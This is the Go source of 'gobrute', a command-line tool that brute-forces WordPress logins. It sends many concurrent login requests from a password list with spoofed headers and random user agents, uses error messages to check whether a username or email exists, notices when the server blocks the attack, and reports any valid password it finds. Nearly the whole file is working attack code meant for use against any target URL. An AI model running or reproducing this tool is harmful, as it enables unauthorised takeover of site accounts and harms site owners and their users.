package main

import (
	"bufio"
	"flag"
	"fmt"
	"gobrute/utils"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
)

var (
	wg          sync.WaitGroup
	Mutex       sync.Mutex
	checkedPass int = 0
	errors      int = 0
)

func checkCredencials(websiteURL string, reqBody map[string]string, c *uint8, semaphore *chan struct{}, totalPass int) {

	defer wg.Done()
	*semaphore <- struct{}{}
	defer func() { <-*semaphore }()

	Mutex.Lock()
	checkedPass++
	Mutex.Unlock()
	data := url.Values{}

	for key, val := range reqBody {
		data.Set(strings.TrimSpace(key), strings.TrimSpace(val))
	}

	req, _ := http.NewRequest("POST", websiteURL, strings.NewReader(data.Encode()))
	req.Close = true

	randomUserAgent := utils.GetUserAgent()

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", randomUserAgent)
	req.Header.Set("Origin", websiteURL)
	req.Header.Set("Referer", websiteURL)

	cookies1 := &http.Cookie{Name: "wordpress_test_cookie", Value: "WP%20Cookie%20check"}

	req.AddCookie(cookies1)

	client := &http.Client{}
	res, err := client.Do(req)

	if err != nil {
		Mutex.Lock()
		errors++
		Mutex.Unlock()
		return
	}

	defer res.Body.Close()

	result, _ := io.ReadAll(res.Body)
	responseString := string(result)

	// Mutex.Lock()
	// resFile, _ := os.Create("response.html")
	// resFile.WriteString(responseString)
	// Mutex.Unlock()

	if len(responseString) < 100 {
		fmt.Println("\033[31m", "Facing error while bruteforce")

		fmt.Println("More info to debug:-")
		fmt.Println("Message: Looks like cloudflare disturbing...")
		fmt.Println("Headers: ", res.Header)
		fmt.Println("Status Code: ", res.Status)
		fmt.Println("Cookies: ", res.Cookies(), "\033[0m")
		os.Exit(0)
	}

	var isBruteBlocked bool = strings.Contains(responseString, "minutes")

	if isBruteBlocked {
		fmt.Println("looks like Bruteforce attack has been blocked by server")
		os.Exit(0)
	}

	if *c == 1 {
		isUsernameValid := strings.Contains(responseString, "not registered")
		isEmailValid := strings.Contains(responseString, "email address.")

		if isUsernameValid {
			fmt.Println("\033[31m", "Username is incorrect.. Enter a valid username to bruteforce", "\033[0m")
			os.Exit(0)
		}
		if isEmailValid {
			fmt.Println("\033[31m", "Email is incorrect.. Enter a valid email to bruteforce", "\033[0m")
			os.Exit(0)
		}

		Mutex.Lock()
		*c = *c + 1
		Mutex.Unlock()
	}

	if len(res.Cookies()) > 1 {
		fmt.Println("\033[32m\n\nValid credencials found:")
		fmt.Printf("Username: %s\nPassword: %s\n\033[0m", reqBody["log"], reqBody["pwd"])
		os.Exit(0)
	} else {
		StatusPercentage := (checkedPass * 100) / totalPass

		utils.PrintStats("\033[2A\rErrors: ", strconv.Itoa(errors)+"\n")
		utils.PrintStats("\rPassword: ", reqBody["pwd"]+"\n")

		fmt.Printf("\033[32m\rChecked: \033[31m%d/%d (%d%%)\033[0m", checkedPass, totalPass, StatusPercentage)
	}

}

func handleMain(websiteURL string, username string, passlist string, threads int) {
	passList, err := os.Open(passlist)

	if err != nil {
		usage("Invalid file location")
	}

	var count uint8 = 1

	semaphore := make(chan struct{}, threads)
	scanner := bufio.NewScanner(passList)
	redirectURL := strings.Replace(websiteURL, "wp-login.php", "wp-admin/", -1)
	totalPass := utils.GetTotalPassNum(passlist)

	for scanner.Scan() {
		wg.Add(1)
		password := scanner.Text()
		reqBody := map[string]string{
			"log":         username,
			"pwd":         password,
			"rememberme":  "forever",
			"wp-submit":   "Log In",
			"redirect_to": redirectURL,
			"testcookie":  "1",
		}

		go checkCredencials(websiteURL, reqBody, &count, &semaphore, totalPass)
	}

	wg.Wait()

	fmt.Println("Valid pass did not found :(")
	os.Exit(0)
}

func usage(errorMSG string) {

	if errorMSG != "" {
		fmt.Println("Error: ", errorMSG)
	}

	fmt.Println("Usage:")
	fmt.Println("gobrute --url URL -u USERNAME/EMAIL -p PASSLIST -t THREADS")
	fmt.Println("gobrute --url https://abc.com/wp-login.php -u admin -p pass.txt -t 10")
	os.Exit(0)
}

func banner() {
	fmt.Println("\033[31m", `
 ██████╗  ██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔════╝ ██╔═══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██║  ███╗██║   ██║██████╔╝██████╔╝██║   ██║   ██║   █████╗  
██║   ██║██║   ██║██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
 ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝`)
	fmt.Println("\tby Anon Shrivastav\n", "\033[0m")
}

func main() {

	var (
		url      string
		username string
		passlist string
		threads  int
	)
	flag.StringVar(&url, "url", "", "URL of the website")
	flag.StringVar(&passlist, "p", "", "Pass list location")
	flag.IntVar(&threads, "t", 10, "Total number of threads")
	flag.StringVar(&username, "u", "", "Username/email of user")
	flag.Parse()

	banner()

	if username == "" {
		usage("Enter username/email")
	}
	if passlist == "" {
		usage("Enter password list")
	}
	if url == "" {
		usage("Enter url")
	}

	fmt.Println("\033[37mAttack Info\033[0m")

	utils.PrintStats("Target: ", url+"\n")
	utils.PrintStats("Username: ", username+"\n")
	utils.PrintStats("Threads: ", strconv.Itoa(threads)+"\n\n\n\n")

	handleMain(url, username, passlist, threads)

}
